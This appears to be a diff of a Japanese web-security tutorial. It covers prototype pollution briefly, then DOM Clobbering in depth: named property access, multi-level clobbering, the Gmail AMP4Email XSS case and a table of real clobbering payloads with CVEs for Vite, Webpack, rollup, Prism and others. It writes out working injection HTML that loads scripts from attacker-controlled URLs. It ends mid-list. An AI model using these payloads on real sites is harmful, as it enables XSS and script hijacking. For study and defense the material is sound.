+- **多層防御としてのCSP**: `script.src` ガジェットのように汚染がスクリプト読み込みへ流れる経路に対し、CSP の `script-src` を厳格化すると被害を限定できる（ただし信頼済みホストに攻撃者JSを置ける場合は回避されうるため、CSP単体を頼りにしない）。
+
+> 出典: Beyond XSS — Prototype Pollution — https://aszx87410.github.io/beyond-xss/en/ch3/prototype-pollution/ / Sonar — Prototype Pollution in Blitz.js Leads to RCE — https://www.sonarsource.com/blog/blitzjs-prototype-pollution/
+
+---
+
+### まとめ
+
+- プロトタイプ汚染は **単体では無害**。実害は必ず「汚染の入口（source）」×「着火点（gadget/sink）」の連鎖で生じる。
+- 入口の三大アンチパターンは **bracketクエリ展開・再帰マージ・パス指定代入**。`__proto__` を弾かれても `constructor.prototype` や不完全サニタイズの潰し込みで回避されうる。
+- クライアントサイドでは Google Analytics（`hitCallback`→`setTimeout`）や Adobe DTM（`trackingServerSecure`→`script.src`）のような **実在ガジェット** がDOM XSS・CSP回避に繋がる。DOM Invader で source×gadget×sink のPoCを自動生成できる。
+- サーバサイド（Node.js）では危険度が一段上がり、**Blitz.js（CVE-2022-23631）** は superjson の `referentialEqualities` を入口に、pages manifest 汚染・`spawn` オプション汚染・`NODE_OPTIONS=--require /proc/self/cmdline` を連鎖させ、**認証不要のRCE** に到達した。
+- 防御は「危険キーの完全拒否」「null プロトタイプ」「`Object.freeze`」「`--disable-proto`」「スキーマ検証」を組み合わせ、入口と着火の両方を塞ぐ。
 
 ---
 
 ## DOM Clobbering
 
-### 概要:「スクリプトなしのXSS」という矛盾
+### 概要:「スクリプトなしのXSS」という一見矛盾した攻撃
 
-DOM Clobbering(DOMクロベリング)は、`<script>`タグや`javascript:`スキームなど、いわゆる「スクリプト」を一切使わずに、HTMLマークアップの注入だけでJavaScriptの実行フローを乗っ取る攻撃手法です。多くの防御策(HTMLサニタイザ、CSPのscript-src制限)は「スクリプトの実行を防ぐ」ことに主眼を置いていますが、DOM Clobberingはスクリプトを実行するのではなく、既存の正規スクリプトが参照する変数やプロパティの「値」を、HTML要素で意図的に上書き(clobber)します。結果として、開発者が「ここは安全な組み込みAPIか、まだ未定義の変数のはずだ」と信じているオブジェクトが、攻撃者の用意した`<a>`や`<form>`要素にすり替わり、最終的に`innerHTML`への代入やスクリプトの動的ロードなど、危険なsink(入力が最終的に実行・解釈される危険な代入先。例: `innerHTML`、`eval()`、`script.src`)に攻撃者の値が流れ込みます。
+DOM Clobbering(DOMクロバリング)は、`<script>`タグや`javascript:`スキーム、イベントハンドラ属性(`onerror`等)を**一切使わずに**、静的なHTMLマークアップの注入だけでJavaScriptの実行フローを乗っ取る攻撃手法です。日本語で「clobber」は「叩き潰す・上書きする」の意で、その名の通り、既存の正規スクリプトが参照するはずの変数やプロパティを、攻撃者が注入したHTML要素で**すり替える(上書きする)**ところに本質があります。
 
-本節では、この攻撃が成立する仕組み(ブラウザの「名前付きプロパティ」機構)を核として、実際に野生で発見された脆弱性(Gmail AMP4Email)、体系化された防御策(OWASP)、そして研究コミュニティが収集した実例集(DOM Clobbering Collection)の3つの資料をもとに、原理から実践までを解説します。
+多くのXSS防御(HTMLサニタイザによる`<script>`除去、CSPの`script-src`制限)は「スクリプトの実行そのものを防ぐ」ことに主眼を置いています。ところがDOM Clobberingは新しいスクリプトを注入しません。**すでにページ上で動いている正規のJavaScript**が参照する値を書き換え、そのコードを「攻撃者の意図した通りに」誤動作させます。したがって、`<a>`や`<form>`、`<img>`といった「無害に見えるタグ」しか許可しないサニタイザ設定を通り抜け、CSPで`<script>`をブロックしていても成立し得ます。研究コミュニティではこの性質から「code-reuse(コード再利用)攻撃」「scriptless(スクリプトなし)injection」とも呼ばれます。
+
+DOM Clobbering Collectionの定義を引用します。
+
+> "DOM Clobbering is a type of code-less injection attack on the web where attackers first inject a seemingly benign, scriptless HTML markup into a webpage."(DOM Clobberingとは、攻撃者がまず一見無害でスクリプトを含まないHTMLマークアップをWebページに注入する、コード無しのインジェクション攻撃の一種である)
+
+本節では、攻撃を成立させるブラウザの中核機構(名前付きプロパティアクセス)を仕組みレベルで解説し、実際に野生で発見された著名な脆弱性(Gmail AMP4Email)、体系化された防御策(OWASP Cheat Sheet)、研究コミュニティが収集した実在ガジェット集(DOM Clobbering Collection)という3つの一次資料をもとに、原理から実践的防御までを一気通貫で扱います。
+
+---
 
 ### 仕組みの核心:名前付きプロパティアクセス(Named Property Access)
 
-DOM Clobberingを理解する鍵は、HTML仕様(WHATWG HTML Standard)が定義する「**名前付きプロパティ可視性アルゴリズム(named property visibility algorithm)**」です。ブラウザはDOMツリーを構築する際、`id`または`name`属性を持つ一部のHTML要素について、その値をキーとして`document`オブジェクトおよび(条件付きで)`window`オブジェクトに自動的にアクセサを生やします。
+DOM Clobberingを理解する唯一かつ最大の鍵は、HTML仕様(WHATWG HTML Standard)が定義する「**名前付きプロパティアクセス**」という、極めて古くからある(そして今も互換性のため残っている)ブラウザ挙動です。
+
+ブラウザはDOMツリーを構築するとき、`id`属性、あるいは一部の要素の`name`属性を持つHTML要素について、その属性値を**キー**として`document`オブジェクトや`window`(グローバル)オブジェクトに**自動的にアクセサ(参照)を生やします**。つまり、HTMLを1行書くだけで、対応する名前のグローバル変数・プロパティが勝手に生成されるのです。
+
+OWASP Cheat Sheetの例を引用します。
 
 ```html
-<form id="x"></form>
+<form id=x></form>
 ```
 
-このHTMLがページに存在するだけで、JavaScript側では以下がすべて成立します。
-
-```js
-document.x   // <form id="x">要素を参照
-window.x     // 同上(グローバルスコープにxという変数が未宣言の場合)
-x            // グローバル変数として同上
+```javascript
+// すべて同じ<form>要素を指す:
+var obj1 = document.getElementById('x');
+var obj2 = document.x;
+var obj3 = window.x;
+var obj4 = x;            // 明示的な宣言なしにグローバル参照になる
+console.log(obj1 === obj2 && obj2 === obj3 && obj3 === obj4); // true
 ```
 
-> なぜ動くか: HTML仕様が`HTMLDocument`と`Window`インターフェースに「名前付きプロパティ」というブラウザ組み込みの仕組みを定義しており、`id`/`name`属性を持つ要素が自動的にそのプロパティ値として登録されるため。これはJavaScriptの通常の変数宣言とは無関係に、パーサがHTMLを解釈した時点で発生する。
+**なぜ動くのか。** HTML仕様は、後方互換性(古いWebサイトが`document.formName`のようにフォームへ直接アクセスしていた時代の名残)のために、名前付き要素を`document`/`window`のプロパティとして露出させることを規定しています。ここで決定的に重要なのは、OWASPが強調する次の性質です。
 
-重要なのは、**この名前付き要素参照が、開発者が明示的に宣言していない変数(未定義のグローバル変数)よりも先に、あるいはそれに代わって解決される**という点です。たとえばコードが
+> "named element references take precedence over built-in APIs and developer-defined attributes during property lookups."(名前付き要素の参照は、プロパティ探索時に組み込みAPIや開発者定義の属性よりも優先される)
 
-```js
+厳密には、`window`/`document`のプロパティ解決順序において、これらの「名前付きプロパティ」は**そのプロパティがまだ定義されていない(=`undefined`である)場合**に露出します。したがって開発者が「まだ代入していないグローバル変数」や「オプショナルな設定オブジェクト」を前提にコードを書いていると、攻撃者はそこにHTML要素を割り込ませることができます。
+
+`window`側と`document`側で、露出のトリガーとなる属性が異なる点も押さえておきましょう。仕様上、`window`に載るのは主に`id`属性(および`embed`/`form`/`img`/`object`の`name`属性)、`document`に載るのは`embed`/`form`/`iframe`/`img`/`object`等の`name`属性(および`id`)です。この違いが、後述する`document.getElementById`のような**組み込みAPI自体の上書き**に効いてきます。
+
+```html
+<img name=cookie>
+<embed name=getElementById></embed>
+```
+```javascript
+console.log(document.cookie);         // <img name="cookie"> 要素そのものが返る
+console.log(document.getElementById); // <embed name="getElementById"> が返る(関数ではなくなる)
+```
+
+> 出典: DOM Clobbering Prevention Cheat Sheet — https://cheatsheetseries.owasp.org/cheatsheets/DOM_Clobbering_Prevention_Cheat_Sheet.html
+> 出典: Can HTML affect JavaScript? Introduction to DOM clobbering(Beyond XSS / Huli)— https://aszx87410.github.io/beyond-xss/en/ch3/dom-clobbering/
+
+#### 単純な悪用例:分岐とスクリプトロードの乗っ取り
+
+OWASPが挙げる最小の悪用例を見ます。まず、未定義前提の変数を使った分岐です。
+
+```javascript
 let redirectTo = window.redirectTo || '/profile/';
 location.assign(redirectTo);
 ```
 
-のように「`window.redirectTo`が定義されていればそれを使い、なければデフォルト値を使う」という一見安全なロジックを書いていたとしても、攻撃者が事前にHTMLインジェクションで
+開発者の意図は「`window.redirectTo`が設定されていればそこへ、なければ`/profile/`へ」。しかし`window.redirectTo`は通常`undefined`なので、攻撃者が以下を注入すると乗っ取れます。
 
 ```html
-<a id="redirectTo" href="javascript:alert(document.domain)"></a>
+<a id=redirectTo href='javascript:alert(1)'></a>
+<!-- オープンリダイレクトなら: -->
+<a id=redirectTo href='phishing.com'></a>
 ```
 
-を注入していれば、`window.redirectTo`は文字列ではなく**この`<a>`要素そのもの**(`HTMLAnchorElement`オブジェクト)になります。この要素はtruthyな値であるため`||`の右辺には進まず、`location.assign()`に要素オブジェクトが渡されます。多くのブラウザAPIはオブジェクトを暗黙的に`toString()`し、`HTMLAnchorElement`の`toString()`は`href`属性の値(絶対URL化されたもの)を返すため、結果として`location.assign("javascript:alert(document.domain)")`相当の呼び出しが発生し、XSSが成立します。
+**なぜ動くのか。** `<a id=redirectTo>`により`window.redirectTo`は`<a>`要素を指すようになります。`location.assign()`は文字列を期待しますが、要素を渡すと内部で文字列化(`toString()`)されます。`<a>`要素の`toString()`は**その`href`属性の値(解決済みURL)を返す**という特別な挙動を持つため、`javascript:alert(1)`という文字列がそのまま`location.assign`に渡り、スクリプトが実行されます。この「`<a>`/`<area>`の`toString()`が`href`を返す」性質は、DOM Clobberingで**任意の文字列を注入する**ための最重要テクニックです。
 
-もう一つの典型パターンとして、ネストした`id`属性による「オブジェクトのプロパティまで汚染する」テクニックがあります。
+次に、より危険なスクリプトの動的ロード乗っ取り。
+
+```javascript
+var script = document.createElement('script');
+let src = window.config.url || 'script.js';
+script.src = src;
+document.body.appendChild(script);
+```
+
+```html
+<a id=config><a id=config name=url href='malicious.js'></a>
+```
+
+**なぜ動くのか。** ここでは`window.config`が(存在すれば)`.url`プロパティを持つオブジェクトであることを前提にしています。攻撃者は`config`という「入れ物」と、その中の`url`という「中身」の**2階層**を作らねばなりません。これを実現するのが、次に述べる多階層クロバリングです。
+
+> 出典: DOM Clobbering Prevention Cheat Sheet — https://cheatsheetseries.owasp.org/cheatsheets/DOM_Clobbering_Prevention_Cheat_Sheet.html
+
+---
+
+### 多階層クロバリング:`a.b.c`のようなネストしたプロパティを作る
+
+実アプリでは`window.config.url`や`AMP_MODE.test`のように、**ドットで連なる**プロパティ参照が普通です。単一の要素では`window.x`しか作れませんが、次の3つのテクニックで2〜3階層のプロパティ木を「HTMLだけで」構築できます。
+
+#### テクニック1:同一`id`の重複でHTMLCollectionを作る
+
+同じ`id`を持つ要素を複数配置すると、`window.<id>`は単一要素ではなく`HTMLCollection`(要素の集合)になります。`HTMLCollection`は、その中の要素の`name`属性値でメンバーアクセスできるため、疑似的な「2階層目」を作れます。
 
 ```html
 <a id="config"></a>
-<a id="config" name="url" href="https://evil.example/malicious.js"></a>
+<a id="config" name="apiUrl" href="https://example.com"></a>
+```
+```javascript
+console.log(config.apiUrl + '') // "https://example.com"
 ```
 
-> なぜ動くか: 同じ`id`を持つ要素が複数存在する場合、ブラウザは`HTMLCollection`(疑似配列)を`document.config`として返す。さらにその`HTMLCollection`に対して`name`属性で追加のプロパティアクセスが定義されるため、`document.config.url`のようなネストしたプロパティパスまで攻撃者が構築できる。これにより`window.config.url || 'script.js'`のような「設定オブジェクトのプロパティを読む」コードまで乗っ取り可能になる。
+**なぜ動くのか。** `id="config"`が2つあるので`window.config`は`HTMLCollection`になります。`HTMLCollection.apiUrl`は、`name="apiUrl"`を持つメンバー要素(2つめの`<a>`)を返します。その`<a>`を文字列化(`+ ''`)すると`href`値が得られる、という前述の`toString()`挙動の合わせ技です。
 
-コードが
+#### テクニック2:`<form>` + `<input>`で本物のネストを作る
 
-```js
-var s = document.createElement('script');
-let src = window.config.url || 'script.js';
-s.src = src;
-document.body.appendChild(s);
-```
-
-のようにconfigオブジェクトのプロパティから動的スクリプトのURLを決定していた場合、上記の注入により任意のリモートJavaScriptを読み込ませることができ、HTMLインジェクションのみからフルのコード実行(XSS)に到達します。
-
-### 攻撃が成立する前提条件
-
-DOM Clobberingは万能ではなく、以下の条件が揃って初めて成立します。
-
-1. **スクリプトタグの直接注入ができない状況であること**: サニタイザやCSPによって`<script>`や`on*`属性、`javascript:`スキームは弾かれるが、`<a>`や`<form>`、`<img>`のような一見無害なタグの`id`/`name`属性は許可されている、という「中途半端なサニタイズ」の場面で威力を発揮します。
-2. **ターゲットのJavaScriptコードが、グローバルスコープの変数・組み込みAPI・`document`/`window`のプロパティを「型チェックなしに」信頼して使っていること**。特に、変数が「まだ定義されていないかもしれない」という前提で`||`や`??`によるデフォルト値パターンを書いているコードは典型的な標的です。
-3. **開発者が「名前付きプロパティ」というブラウザの挙動そのものを認識していないこと**。これは言語仕様のグレーゾーンであり、通常のセキュアコーディング教育では見落とされがちです。
-
-### 実例1: Gmail AMP4EmailにおけるDOM Clobbering(Michał Bentkowski, Securitum)
-
-> ⚠️ **未取得の資料**: 「XSS in GMail's AMP4Email via DOM Clobbering」(Securitum, Michał Bentkowski)は自動取得できませんでした(理由: 対象ドメイン`research.securitum.com`が本環境のegressプロキシによりブロックされているため)。以下のURLからユーザーご自身で直接ご覧ください: https://research.securitum.com/xss-in-amp4email-dom-clobbering/
-
-(以下は未取得資料の補足として、Web検索で得られた二次情報および一般知識に基づく解説です)
-
-2019年8月、セキュリティ研究者Michał Bentkowski(Securitum)は、GmailのAMP4Email(「ダイナミックメール」とも呼ばれる、メール本文にAMP HTMLを埋め込んで動的コンテンツを表示できるGoogleの機能)においてDOM ClobberingによるXSSを発見し、Google Vulnerability Reward Program(VRP)に報告しました。Googleは2019年10月12日までに修正を完了し、Bentkowskiは2019年11月18日に詳細を公開、報奨金5,000ドルを獲得しています。
-
-AMP4Emailは、メール本文というきわめて信頼できない入力(送信者が完全に内容を制御できる)からHTMLを描画するにもかかわらず動的な挙動を許すという、構造的にリスクの高い機能でした。そのためGoogleはあらかじめDOM Clobbering対策として、`id`属性に`"AMP"`のような特定の予約語を使うことを**禁止するフィルタ**を実装していました。これは「AMPランタイムの内部変数名を`id`属性で上書きされる」典型的なDOM Clobberingを防ぐ意図です。
-
-しかし、Bentkowskiはこのフィルタが`"AMP"`という文字列は弾くものの、`"AMP_MODE"`という別の内部識別子までは想定していないことを発見しました。攻撃者が
+`<form>`要素は、その内部のフォーム部品(`<input>`等)に`name`でアクセスできる「コンテナ」として振る舞います。これを使うと`config.prod.apiUrl.value`のような**3階層**が作れます。
 
 ```html
-<a id="AMP_MODE"></a>
+<form id="config"></form>
+<form id="config" name="prod">
+  <input name="apiUrl" value="123" />
+</form>
+```
+```javascript
+console.log(config.prod.apiUrl.value) // "123"
 ```
 
-を注入すると、AMPランタイム内部で`AMP_MODE`というグローバル変数(本来はAMPの実行モード情報を保持するオブジェクト)にアクセスしようとした際、それが`<a>`要素にclobberされ、その結果としてAMPが動的スクリプトを読み込むためのURL構築ロジックの一部が`undefined`という文字列を含んだまま実行され、コンソールにスクリプト読み込みエラー(URLの一部が`undefined`になっている404エラー)が出力されました。
+**なぜ動くのか。** `id="config"`が2つ→`window.config`は`HTMLCollection`。`config.prod`は`name="prod"`の2つめの`<form>`。`<form>`はその配下の名前付き部品を露出するので`config.prod.apiUrl`は`<input>`要素、`.value`でその`value`属性値`"123"`が読めます。`<input>.value`は**任意の文字列を格納できる**ため、`href`の`toString`だけでは作りにくい文字列(スペースや特殊文字を含む値)を運ぶのに有用です。
 
-> なぜ動くか: `AMP_MODE`という名前は、開発者が「絶対に外部から上書きされない内部変数」だと想定していたが、それは単なる`window`スコープの変数であり、DOM Clobberingの対象になり得た。フィルタは既知の危険な識別子(`"AMP"`)だけをブロックリスト方式で防いでおり、関連する別の内部識別子(`AMP_MODE`)を見落としていた。ブロックリスト型の防御は、対象システムの内部実装(変数名の全体像)を完全に把握できない限り漏れが生じるという典型例。
+#### テクニック3:`<iframe srcdoc>`でさらに階層を稼ぐ
 
-Bentkowskiはさらに研究を進め、`AMP_MODE.test`と`AMP_MODE.localDev`という2つのプロパティを共にtruthyにし、加えて`window.testLocation`という別の変数もclobberすることで、AMPランタイムに「これはテスト/ローカル開発環境である」と誤認させ、本来は運用環境では読み込まれないはずの任意のリモートJavaScriptファイルを読み込ませる経路を構築しました。複数のDOM要素(`id`と`name`の組み合わせ)を巧妙に配置することで、単一の変数だけでなく、条件分岐を成立させる複数の関連プロパティを同時にclobberするというテクニックです。
+さらに深い階層や、`window`直下の別名前空間が必要な場合、`<iframe>`の`name`と`srcdoc`(インラインHTML)を組み合わせます。
 
-最終的にこの脆弱性は理論上フルのXSSに到達するものでしたが、実際の攻撃としてはAMPコンテンツに対して別途デプロイされていたContent-Security-Policy(CSP)によってコード実行そのものは緩和されていた、という点も報告されています。この事例は、DOM Clobberingを見つけた後に「それが本当にコード実行まで到達するか」を確認する多層防御(CSPなど)の重要性も同時に示しています。
-
-> 出典: XSS in GMail's AMP4Email via DOM Clobbering — https://research.securitum.com/xss-in-amp4email-dom-clobbering/ (二次情報: SecurityWeek, sekurak.pl 等の報道に基づく要約)
-
-### 資料2: OWASP DOM Clobbering Prevention Cheat Sheet
-
-> ⚠️ **未取得の資料の補足について**: `cheatsheetseries.owasp.org`への直接アクセスは本環境のegressプロキシでブロックされましたが、OWASP CheatSheetSeriesリポジトリのGitHub上のMarkdown原本(raw.githubusercontent.com経由)を取得できたため、内容は反映されています。念のため一次情報は以下のURLからも参照できます: https://cheatsheetseries.owasp.org/cheatsheets/DOM_Clobbering_Prevention_Cheat_Sheet.html
-
-OWASPのこのチートシートは、DOM Clobberingの定義を「攻撃者が、セキュリティ上重要な変数やブラウザAPIと**同じ`id`または`name`属性**を持つHTML要素を注入することで、その値を意図的に上書きする攻撃」と整理し、13項目の防御ガイドラインを2つのグループに分けて提示しています。
-
-**グループA: 技術的対策(実行環境・ツールでの緩和)**
-
-- **HTMLサニタイザの適切な設定**: DOMPurifyを使う場合、`SANITIZE_NAMED_PROPS`オプションを有効化すると、`id`/`name`属性の値に`user-content-`のようなプレフィックスが自動付与され、名前空間の衝突を防げます。
-
-```js
-DOMPurify.sanitize(dirty, { SANITIZE_NAMED_PROPS: true });
+```html
+<iframe name="moreLevel" srcdoc='
+  <form id="config"></form>
+  <form id="config" name="prod">
+    <input name="apiUrl" value="123" />
+  </form>
+'></iframe>
+```
+```javascript
+setTimeout(() => {
+  console.log(moreLevel.config.prod.apiUrl.value) // "123"
+}, 500)
 ```
 
-> なぜ動くか: 属性値そのものを書き換えてしまえば、攻撃者が`id="redirectTo"`のような「狙った名前」を注入しても、実際にDOMへ反映される値は`id="user-content-redirectTo"`のように変形され、コード側が参照する変数名と一致しなくなるため、名前付きプロパティの衝突が起こらなくなる。
+**なぜ動くのか。** `<iframe name="moreLevel">`により`window.moreLevel`はそのiframeの`contentWindow`を指します。iframe内部のHTMLは`srcdoc`で独立した文書として構築され、その中で作ったクロバリング木に`moreLevel.config.prod...`と外側からたどれます。`setTimeout`で待つのは、iframeの読み込み(内部DOM構築)が非同期だからです。この手法はネストの深さを事実上無制限にできる反面、非同期になる点が実戦での制約になります。
 
-- **CSPの活用**: `script-src`によるスクリプト読み込み元の制限は、DOM Clobberingを起点として「外部スクリプトを動的に読み込ませる」タイプの攻撃(前述のconfig.url例)を緩和できます。ただし、`eval()`やテンプレートエンジンのコード評価構造を悪用するタイプのDOM Clobbering(スクリプトの新規ロードを伴わない、既存コードのロジック改変)には効果がありません。
-- **重要なオブジェクトの凍結**: `Object.freeze(window)`のように重要なグローバルオブジェクトを不変化する手法もありますが、保護すべき対象を漏れなく洗い出すことは実務上困難です。
+> 出典: Can HTML affect JavaScript? Introduction to DOM clobbering(Beyond XSS)— https://aszx87410.github.io/beyond-xss/en/ch3/dom-clobbering/
 
-**グループB: セキュアコーディングの実践**
+---
 
-- **明示的な変数宣言**(`var`/`let`/`const`の徹底): ただし、興味深いことに`let`で宣言したブロックスコープ変数であっても、**`window.VARNAME`という形でのDOM Clobberingから完全には保護されない**とされています。これは`let`がグローバルの`window`オブジェクトのプロパティにはならない一方で、コードが`window.VARNAME`のように明示的に`window`経由でアクセスしていれば、依然としてclobberされたプロパティを読んでしまうためです。
-- **`document`/`window`をグローバルな値の保存先に使わない**: これらのオブジェクトはHTMLの構造次第でいつでも改変されうる「信頼できない共有状態」であるため。
-- **組み込みAPIであっても無条件に信頼しない**: 名前付きプロパティ可視性アルゴリズムにより、ブラウザ組み込みのプロパティやメソッドさえもDOM要素によって上書きされうるため、値を使う前に検証が必要です。
-- **型チェックの実装**(`instanceof`): clobberされた値は必ず`Element`(または`HTMLCollection`)のインスタンスになるため、
+### 実戦ケーススタディ:Gmail AMP4Email の XSS(Michał Bentkowski, 2019)
 
-```js
-if (window.config instanceof HTMLElement) {
-  // clobberされている可能性が高いので使わない
+DOM Clobberingが「理論上の面白ネタ」ではなく、Googleが「awesome」と評した実害あるXSSを生むことを示した金字塔的事例が、Michał Bentkowski(Securitum)によるGmailのAMP4Email脆弱性です。
+
+#### 背景:AMP4Emailと、なぜスクリプトが使えないのか
+
+AMP4Email(dynamic mail / 動的メール)は、Gmailのメール本文にインタラクティブなHTMLを埋め込める仕組みです。メールという極めて危険な配信経路でHTMLを許すため、Googleは二重三重の防御を敷いていました。
+
+- **AMPバリデータ**: `<script>`やイベントハンドラ、任意のCSS等を禁止し、AMP独自の許可タグ・属性しか通さない。
+- **CSP(Content-Security-Policy)**: 万一スクリプトが紛れ込んでも実行元を制限。
+
+つまり「普通のXSS」は入口で全滅する設計です。Bentkowskiが着目したのは、**バリデータが`id`属性そのものは禁止していなかった**点でした。`id`が使えるなら、DOM Clobberingの土俵に持ち込める――ここから調査が始まります。
+
+#### 突破口:`AMP_MODE`という許可された名前
+
+AMP4EmailはDOM Clobbering対策として、`AMP`など一部の`id`値を禁止していました。しかしBentkowskiは、内部の設定オブジェクト`AMP_MODE`がこの禁止リストから漏れていることを発見します。`<a id=AMP_MODE>`を仕込むと、コンソールに興味深いエラーが現れました。AMPの内部コードが以下のようなパターンでスクリプトのURLを組み立てていたのです(記事で示された、AMPソースに相当するコード)。
+
+```javascript
+var script = window.document.createElement("script");
+script.async = false;
+var loc;
+if (AMP_MODE.test && window.testLocation) {
+    loc = window.testLocation;
+} else {
+    loc = window.location;
+}
+if (AMP_MODE.localDev) {
+    loc = loc.protocol + "//" + loc.host + "/dist";
+} else {
+    loc = "https://cdn.ampproject.org";
+}
+var singlePass = AMP_MODE.singlePassType ? AMP_MODE.singlePassType + "/" : "";
+b.src = loc + "/rtv/" + AMP_MODE.rtvVersion + "/" + singlePass + "v0/" + pluginName + ".js";
+document.head.appendChild(b);
+```
+
+`AMP_MODE`が正規のコードで参照されており、しかもその値が**スクリプトのロード先URLの組み立て**に使われている――これはDOM Clobberingにとって理想的なsinkです。
+
+#### メカニズムの分解:URLをどう乗っ取るか
+
+`<a id=AMP_MODE>`だけを置くと、`AMP_MODE`は`<a>`要素になります。すると`AMP_MODE.rtvVersion`は`undefined`となり、URLは次のように壊れます。
+
+```
+https://cdn.ampproject.org/rtv/undefined/v0/amp-auto-lightbox-0.1.js
+```
+
+コンソールに現れた`undefined`は、「攻撃者がこのオブジェクトを掌握できている」動かぬ証拠でした。ここから、URLを完全に攻撃者側へ向けるために2つのフラグを`truthy`(真と評価される値)にし、ロード先(`loc`)を差し替えます。
+
+1. `AMP_MODE.test` を truthy にする → 分岐が`window.testLocation`を見るようになる。
+2. `AMP_MODE.localDev` を truthy にする → `loc = loc.protocol + "//" + loc.host + "/dist"` の枝に入る。
+3. `window.testLocation` 自体もクロバリングし、その`protocol`(や`host`)を攻撃者URLにする。
+
+これを実現する注入HTMLが以下です。
+
+```html
+<a id="AMP_MODE" name="localDev"></a>
+<a id="AMP_MODE" name="test"></a>
+<a id="testLocation"></a>
+<a id="testLocation" name="protocol" href="https://pastebin.com/raw/0tn8z0rG#"></a>
+```
+
+**なぜ動くのか(1行ずつ)。**
+- `id="AMP_MODE"`が2つ→`window.AMP_MODE`は`HTMLCollection`。
+- `AMP_MODE.localDev`は`name="localDev"`の`<a>`要素で、要素オブジェクトは`truthy`。よって`if (AMP_MODE.localDev)`が成立。
+- `AMP_MODE.test`も同様に`truthy`。`window.testLocation`も次の要素で存在するので`if (AMP_MODE.test && window.testLocation)`が成立し、`loc = window.testLocation`。
+- `id="testLocation"`が2つ→`testLocation`も`HTMLCollection`。`testLocation.protocol`は`name="protocol"`の`<a>`。`loc.protocol`はその`<a>`の`href`の`toString()`で`"https://pastebin.com/raw/0tn8z0rG#"`となる。
+- 末尾の`#`は続く`"//" + loc.host + ...`をフラグメント(URLの`#`以降=サーバーに送られない部分)に押し込み、結果としてスクリプトが`https://pastebin.com/...`(攻撃者が中身を制御できるJS)からロードされる。
+
+この一連の流れは、単一要素の`window.x`しか作れないはずのDOM Clobberingで、**多階層プロパティ・truthy分岐の操作・`<a>`の`toString`によるURL文字列注入**という主要テクニックを総動員した好例です。
+
+#### 結末とCSPという最後の壁、そして影響
+
+Bentkowskiはスクリプトのロード先を攻撃者側へ向けることに成功しましたが、**AMP環境のCSP**がロードされるスクリプトの実行元を制限していたため、公開PoCの段階では「完全な任意JS実行」までは至らなかったと各報告は記しています。それでもGoogleはこの発見を高く評価しました。要旨として、**サニタイザとバリデータで固めた"スクリプト禁止"環境が、`id`属性の見落としとDOM Clobbering一つで根底から揺らぐ**ことを証明した点に価値があります。
+
+タイムライン(公開情報):
+- 2019年8月15日: Googleへ報告
+- 2019年8月16日: 初期受領
+- 2019年9月10日: Google「the bug is awesome, thanks for reporting!」
+- 2019年10月12日: 修正確認
+- 2019年11月18日: 一般公開(報奨金 $5,000)
+
+> ⚠️ **一次資料へのアクセスについて**: 一次資料 `research.securitum.com/xss-in-amp4email-dom-clobbering/`(Bentkowski本人の記事)は現在 `securitum.com` のランディングページへ302リダイレクトされ、本文を直接取得できませんでした。URL: https://research.securitum.com/xss-in-amp4email-dom-clobbering/ 上記の技術的内容は、同記事を精緻に再現しているBeyond XSS(Huli)、および SecurityAffairs / SecurityWeek の報道から復元しています。
+
+> 出典: XSS in GMail's AMP4Email via DOM Clobbering(Michał Bentkowski / Securitum)— https://research.securitum.com/xss-in-amp4email-dom-clobbering/
+> 出典: Can HTML affect JavaScript?(Beyond XSS)— https://aszx87410.github.io/beyond-xss/en/ch3/dom-clobbering/
+> 出典: Google addressed an XSS flaw in Gmail defining it awesome(SecurityAffairs)— https://securityaffairs.com/94030/hacking/google-xss-flaw-2.html
+
+---
+
+### 実在ガジェット集:DOM Clobbering Collection
+
+「理屈は分かった。では現実のライブラリにこんな穴が本当にあるのか?」という問いに、jackfromeast と ishmeal が維持する **DOM Clobbering Collection** が答えます。これは、HTMLインジェクションに弱い、あるいはDOM Clobberingガジェット(攻撃者がクロバリングで悪用できる正規コードの断片)を含むクライアントサイドライブラリを体系的にまとめたリポジトリです。
+
+#### 圧倒的に多いパターン:`currentScript` クロバリング
+
+収集された多数のガジェットで、繰り返し登場する最頻出パターンが `document.currentScript` の悪用です。ライブラリは「自分自身がどのURLからロードされたか」を知るために`document.currentScript.src`を読み、そこから相対的に追加のスクリプト/リソースのURLを組み立てることがよくあります。攻撃者は`name="currentScript"`を持つ`<img>`を注入して`document.currentScript`をその要素にすり替え、`src`を攻撃者URLにします。
+
+主要なCVE付き実例(いずれも2024年に採番):
+
+| ライブラリ | バージョン | ペイロード | 影響 | CVE |
+|---|---|---|---|---|
+| Vite | v5.4.5 | `<img src="https://attack.hulk" name="currentScript">` | XSS | CVE-2024-45812 |
+| Webpack | v5.93.0 | `<img name="currentScript" src="https://attack.hulk"></img>` | XSS | CVE-2024-43788 |
+| rollup | v4.21.3 | `<img src="https://attack.hulk" name="currentScript">` | XSS | CVE-2024-47068 |
+| Prism | v1.29.0 | `<img name="currentScript" src="https://attack.hulk/a.js"></img>` | XSS | CVE-2024-53382 |
+| layui | v2.9.16 | `<img name="currentScript" src="https://attack.hulk">` | XSS | CVE-2024-47075 |
+| rspack | v1.0.0-rc.0 | `<img name="currentScript" src="https://attack.hulk"></img>` | XSS | CVE-2024-43788 |
+
+**なぜ`<img>`で動くのか。** ライブラリのブートストラップコードは概ね `var src = document.currentScript.src; loadMore(src + '/chunk.js')` のような形をとります。攻撃者のHTMLが本来より先(または適切な位置)に置かれ、`document.currentScript`が`undefined`または上書き可能な状況だと、`name="currentScript"`の`<img>`が返り、その`.src`は`<img>`の`src`属性=攻撃者URLです。結果として後続スクリプトが攻撃者ドメインからロードされXSSに至ります。Vite/Webpack/rollupといった**モダンなフロントエンドの中核ツール**が軒並み該当した事実は、このガジェットが「例外」ではなく「構造的に頻出する」ことを物語ります。
+
+#### 複数要素・a要素id型のガジェット
+
+`currentScript`以外にも、複数`name`同名要素で`scripts`コレクションを作る型や、`<a id=...>`で設定URLを差し込む型があります。
+
+```html
+<!-- Astro v4.5.9 (CVE-2024-47885): 同名フォーム2つで scripts を作る -->
+<form name="scripts">alert(1)</form><form name="scripts">alert(1)</form>
+
+<!-- seajs v3.0.3 (CVE-2024-51091): 同名imgで scripts コレクション -->
+<img name="scripts" src="https://attack.hulk"><img name="scripts" src="https://attack.hulk">
+
+<!-- UMeditor v1.2.2 (CVE-2024-53387): a要素idで設定URLを上書き -->
+<a id="UMEDITOR_HOME_URL" href="https://attack.hulk/"></a>
+
+<!-- plotly.js v2.35.2: 2階層(HTMLCollection + name)でBASE_URLを注入(CSRF) -->
